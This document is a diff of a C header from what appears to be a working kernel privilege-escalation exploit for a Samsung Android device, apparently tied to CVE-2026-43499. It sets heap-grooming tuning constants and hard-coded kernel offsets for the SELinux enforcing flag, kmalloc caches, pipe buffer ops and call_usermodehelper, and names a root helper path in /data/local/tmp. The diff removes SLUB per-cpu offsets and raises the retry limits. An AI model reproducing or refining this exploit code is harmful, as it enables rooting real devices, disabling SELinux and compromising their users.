@@ -68,12 +68,6 @@
  * drops to 4 because wanted = collisions-1 = 3 is what this device has been
  * measured to produce, where the dm1q value of 5 demands 4 and cannot pass. */
 #define S918_PAGE_SCAN_MAX 256
-/* Cap one collect() cycle below the absolute ceiling so a pathological scan
- * returns to the outer retry (which now runs at most two cycles) instead of
- * churning through all 256 attempts. */
-#define S918_PAGE_SCAN_CYCLE_ATTEMPTS 128
-/* Abandon a hint that keeps re-matching the same already-seen slot. */
-#define S918_DUP_STREAK_MAX 8
 #define S918_KSNITCH_HINT_COLLISIONS 2
 #define S918_KSNITCH_FULL_COLLISIONS 4
 #define S918_KSNITCH_APPENDED_FUTEXES 4096
@@ -128,8 +122,7 @@
 #define APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES 16
 #define APP_FOPS_FRESH_PAGE_ATTEMPTS 8
 #define APP_FOPS_KERNEL_PAGE_SEARCH_BATCHES 16
-/* Two scan cycles bound the controlled search to the app budget. */
-#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 2
+#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 8
 #define PIPE_FIRST_LEAK_ATTEMPTS 3
 /* one long-lived attempt instead of many short ones: every attempt exit is
  * a teardown/reset exposure moment (field evidence 3x download mode) */
@@ -200,18 +193,6 @@
 #define SELINUX_ENFORCING_OFF 0x025c92f8ULL
 #define KMALLOC_CACHES_OFF 0x01792ed8ULL
 #define ANON_PIPE_BUF_OPS_OFF 0x0120c610ULL
-/* SLUB lookup path, BTF vmlinux.btf (kernel 6.1.157):
- *   struct kmem_cache      { struct kmem_cache_cpu *cpu_slab; ... }; 0x00
- *   struct kmem_cache_cpu  { freelist 0x00, tid 0x08, slab 0x10,
- *                            partial 0x18 };  (32 B)
- *   struct kmem_cache_node { nr_partial 0x08, partial 0x10, ... }
- *   struct slab            { slab_cache 0x18, freelist 0x20,
- *                            counters 0x28, ... }
- * __per_cpu_offset = 0xffffffc00a2cb650 - KIMAGE_TEXT_BASE = 0x022cb650. */
-#define KMEM_CACHE_CPU_SLAB_OFF 0x00ULL
-#define KMEM_CACHE_CPU_ACTIVE_OFF 0x10ULL
-#define KMEM_CACHE_CPU_PARTIAL_OFF 0x18ULL
-#define PER_CPU_OFFSET_OFF 0x022cb650ULL
 
 #define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
 #define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
@@ -230,7 +211,6 @@
 #define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
 #define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
 #define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
-#define PER_CPU_OFFSET (KIMAGE_TEXT_BASE + PER_CPU_OFFSET_OFF)
 
 #define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
 #define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d4360ULL
